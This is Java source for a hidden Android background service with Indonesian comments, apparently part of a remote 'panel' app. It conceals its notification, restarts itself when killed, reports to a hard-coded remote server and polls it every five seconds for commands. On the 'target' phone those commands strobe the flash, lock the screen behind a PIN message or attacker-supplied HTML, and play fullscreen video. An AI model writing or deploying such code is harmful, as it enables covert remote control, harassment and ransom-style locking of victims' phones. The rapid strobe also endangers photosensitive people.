package com.nex.panel;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * BackgroundService
 * ─────────────────
 * KUNCI UTAMA: service ini HARUS tetap berjalan sebagai Foreground Service
 * agar tidak di-kill Android saat app ditutup. Notifikasi disembunyikan
 * dengan IMPORTANCE_NONE bukan dengan stopForeground (stopForeground akan
 * membuat service menjadi background dan langsung di-kill).
 *
 * - Heartbeat 30 detik  → device tetap ONLINE
 * - Poll command 5 detik → eksekusi Flash/Lock dari Lunex
 * - START_STICKY         → restart otomatis jika di-kill sistem
 */
public class BackgroundService extends Service {

    private static final String API_BASE      = "http://hanz-cpanel-private.pteroq.biz.id:10874";
    private static final String CH_ID         = "nex_bg_v3";
    private static final int    NOTIF_ID      = 9984;
    private static final String FLUTTER_PREFS = "FlutterSharedPreferences";

    private ScheduledExecutorService scheduler;
    private final Handler uiHandler = new Handler(Looper.getMainLooper());
    private boolean isStrobeRunning = false;
    private Runnable strobeRunnable;

    // ── onCreate: WAJIB startForeground, JANGAN stopForeground ──────────
    @Override
    public void onCreate() {
        super.onCreate();
        createHiddenChannel();
        // Mulai sebagai foreground service dengan notif invisible
        // JANGAN stopForeground() — service harus tetap foreground
        // agar tidak di-kill Android saat app ditutup
        try {
            startForeground(NOTIF_ID, buildInvisibleNotification());
        } catch (Exception e) {
            try {
                startForeground(NOTIF_ID, buildFallbackNotification());
            } catch (Exception ignored) {}
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startTasks();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        stopTasks();
        scheduleRestart();
        super.onDestroy();
    }

    // ── Self-restart saat di-kill via AlarmManager (aman di Android 12+) ───
    private void scheduleRestart() {
        try {
            // Coba langsung dulu (kadang masih bisa)
            Intent direct = new Intent(this, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(direct);
            } else {
                startService(direct);
            }
        } catch (Exception ignored) {}

        try {
            // Safety net: AlarmManager restart setelah 3 detik
            // Ini yang bekerja meskipun di Android 12+ background start restriction
            Intent restart  = new Intent(this, BootReceiver.class);
            restart.setAction("com.nex.panel.RESTART_SERVICE");
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }
            PendingIntent pi = PendingIntent.getBroadcast(this, 9001, restart, flags);
            AlarmManager am  = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (am != null) {
                am.set(AlarmManager.RTC_WAKEUP,
                       System.currentTimeMillis() + 3000, pi);
            }
        } catch (Exception ignored) {}
    }

    // ── Start heartbeat + poll scheduler ────────────────────────────────
    private void startTasks() {
        if (scheduler != null && !scheduler.isShutdown()) return;
        scheduler = Executors.newScheduledThreadPool(2);
        scheduler.scheduleAtFixedRate(this::sendHeartbeat, 0, 30, TimeUnit.SECONDS);
        scheduler.scheduleAtFixedRate(this::pollCommands, 3, 5, TimeUnit.SECONDS);
    }

    private void stopTasks() {
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdownNow();
        }
        scheduler = null;
        stopStrobe();
    }

    // ── Baca nilai dari Flutter SharedPreferences ────────────────────────
    private String getFlutterPref(String key) {
        try {
            SharedPreferences prefs =
                getSharedPreferences(FLUTTER_PREFS, Context.MODE_PRIVATE);
            String val = prefs.getString("flutter." + key, "");
            if (val != null && !val.isEmpty()) return val;
            val = prefs.getString(key, "");
            return val != null ? val : "";
        } catch (Exception e) {
            return "";
        }
    }

    // ── Heartbeat → device tetap ONLINE ─────────────────────────────────
    private void sendHeartbeat() {
        String uid      = getFlutterPref("nex_uid");
        String deviceId = getFlutterPref("nex_device_id");
        if (uid.isEmpty() || deviceId.isEmpty()) return;
        try {
            JSONObject body = new JSONObject();
            body.put("uid",      uid);
            body.put("deviceId", deviceId);
            postJson(API_BASE + "/deviceHeartbeat", body.toString());
        } catch (Exception ignored) {}
    }

    // ── Poll perintah dari API lalu eksekusi ─────────────────────────────
    private void pollCommands() {
        String uid      = getFlutterPref("nex_uid");
        String deviceId = getFlutterPref("nex_device_id");
        if (uid.isEmpty() || deviceId.isEmpty()) return;
        try {
            String resp = getJson(
                API_BASE + "/pollCommand?uid=" + uid + "&deviceId=" + deviceId);
            if (resp == null || resp.isEmpty()) return;
            JSONObject data = new JSONObject(resp);
            if (!data.optBoolean("success", false)) return;
            JSONArray cmds = data.optJSONArray("commands");
            if (cmds == null || cmds.length() == 0) return;
            for (int i = 0; i < cmds.length(); i++) {
                executeCommand(cmds.getJSONObject(i));
            }
        } catch (Exception ignored) {}
    }

    // ── Eksekusi perintah dari Lunex ─────────────────────────────────────
    private void executeCommand(JSONObject cmd) {
        String command = cmd.optString("command", "");
        switch (command) {
            case "startStrobe":
            case "torchOn":
                uiHandler.post(this::startStrobe);
                break;

            case "stopStrobe":
            case "torchOff":
                uiHandler.post(this::stopStrobe);
                break;

            case "lockDevice": {
                JSONObject extra = cmd.optJSONObject("extra");
                String rawMsg = cmd.optString("message", "");
                String rawPin = cmd.optString("pin", "");
                if (rawMsg.isEmpty() && extra != null)
                    rawMsg = extra.optString("message", "HP ANDA DIKUNCI!");
                if (rawPin.isEmpty() && extra != null)
                    rawPin = extra.optString("pin", "1234");
                final String msg = rawMsg.isEmpty() ? "HP ANDA DIKUNCI!" : rawMsg;
                final String pin = rawPin.isEmpty() ? "1234" : rawPin;
                uiHandler.post(() -> {
                    try {
                        Intent lock = new Intent(this, LockOverlayService.class);
                        lock.setAction(LockOverlayService.ACTION_LOCK);
                        lock.putExtra(LockOverlayService.EXTRA_MESSAGE, msg);
                        lock.putExtra(LockOverlayService.EXTRA_PIN, pin);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(lock);
                        } else {
                            startService(lock);
                        }
                    } catch (Exception ignored) {}
                });
                break;
            }

            case "unlockDevice":
                uiHandler.post(() -> {
                    try {
                        Intent unlock = new Intent(this, LockOverlayService.class);
                        unlock.setAction(LockOverlayService.ACTION_UNLOCK);
                        startService(unlock);
                    } catch (Exception ignored) {}
                });
                break;

            case "lockDeviceHtml": {
                // Ambil HTML dari body perintah (key: "html")
                String rawHtml = cmd.optString("html", "");
                final String finalHtml = rawHtml.isEmpty()
                    ? "<html><body style='background:#000;color:#fff;display:flex;"
                    + "align-items:center;justify-content:center;height:100vh;"
                    + "font-family:monospace;font-size:24px;'>🔒 DEVICE LOCKED</body></html>"
                    : rawHtml;
                uiHandler.post(() -> {
                    try {
                        Intent lockHtml = new Intent(this, LockOverlayService.class);
                        lockHtml.setAction(LockOverlayService.ACTION_LOCK_HTML);
                        lockHtml.putExtra(LockOverlayService.EXTRA_HTML, finalHtml);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(lockHtml);
                        } else {
                            startService(lockHtml);
                        }
                    } catch (Exception ignored) {}
                });
                break;
            }

            case "unlockDeviceHtml":
                // Sama persis dengan unlockDevice — tutup overlay apapun
                uiHandler.post(() -> {
                    try {
                        Intent unlockHtml = new Intent(this, LockOverlayService.class);
                        unlockHtml.setAction(LockOverlayService.ACTION_UNLOCK);
                        startService(unlockHtml);
                    } catch (Exception ignored) {}
                });
                break;

            case "videoOverlay":
                // Tampilkan overlay video fullscreen + suara di HP target
                uiHandler.post(() -> {
                    try {
                        Intent videoIntent = new Intent(this, VideoOverlayService.class);
                        videoIntent.setAction(VideoOverlayService.ACTION_SHOW_VIDEO);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(videoIntent);
                        } else {
                            startService(videoIntent);
                        }
                    } catch (Exception ignored) {}
                });
                break;

            case "stopVideoOverlay":
                // Hentikan overlay video — HP target kembali normal
                uiHandler.post(() -> {
                    try {
                        Intent stopVideo = new Intent(this, VideoOverlayService.class);
                        stopVideo.setAction(VideoOverlayService.ACTION_STOP_VIDEO);
                        startService(stopVideo);
                    } catch (Exception ignored) {}
                });
                break;
        }
    }

    // ── Strobe flash kedap-kedip 30ms ────────────────────────────────────
    private void startStrobe() {
        if (isStrobeRunning) return;
        isStrobeRunning = true;
        try {
            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) { isStrobeRunning = false; return; }
            final boolean[] on = {false};
            strobeRunnable = new Runnable() {
                @Override public void run() {
                    try {
                        String id = cm.getCameraIdList()[0];
                        on[0] = !on[0];
                        cm.setTorchMode(id, on[0]);
                        if (isStrobeRunning) uiHandler.postDelayed(this, 30);
                    } catch (Exception e) {
                        isStrobeRunning = false;
                    }
                }
            };
            uiHandler.post(strobeRunnable);
        } catch (Exception e) {
            isStrobeRunning = false;
        }
    }

    private void stopStrobe() {
        isStrobeRunning = false;
        if (strobeRunnable != null) {
            uiHandler.removeCallbacks(strobeRunnable);
            strobeRunnable = null;
        }
        try {
            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            if (cm != null) {
                cm.setTorchMode(cm.getCameraIdList()[0], false);
            }
        } catch (Exception ignored) {}
    }

    // ── HTTP POST ────────────────────────────────────────────────────────
    private void postJson(String urlStr, String json) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        try (OutputStream os = conn.getOutputStream()) {
            os.write(json.getBytes("UTF-8"));
        }
        conn.getResponseCode();
        conn.disconnect();
    }

    // ── HTTP GET ─────────────────────────────────────────────────────────
    private String getJson(String urlStr) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        try {
            Scanner sc = new Scanner(conn.getInputStream(), "UTF-8");
            StringBuilder sb = new StringBuilder();
            try {
                while (sc.hasNextLine()) sb.append(sc.nextLine());
            } finally {
                sc.close();
            }
            return sb.toString();
        } finally {
            conn.disconnect();
        }
    }

    // ── Channel IMPORTANCE_NONE: notif tidak tampil sama sekali ──────────
    private void createHiddenChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel ch = new NotificationChannel(
                    CH_ID,
                    "System",
                    NotificationManager.IMPORTANCE_NONE
                );
                ch.setShowBadge(false);
                ch.setSound(null, null);
                ch.enableVibration(false);
                ch.enableLights(false);
                ch.setDescription("");
                ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
                NotificationManager nm =
                    (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                if (nm != null) nm.createNotificationChannel(ch);
            } catch (Exception ignored) {}
        }
    }

    // ── Notifikasi invisible (channel IMPORTANCE_NONE = tidak muncul) ────
    private Notification buildInvisibleNotification() {
        return new NotificationCompat.Builder(this, CH_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_transparent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(true)  // ongoing = tidak bisa diswipe user
            .build();
    }

    // ── Fallback jika ic_transparent gagal ──────────────────────────────
    private Notification buildFallbackNotification() {
        return new NotificationCompat.Builder(this, CH_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(true)
            .build();
    }
}
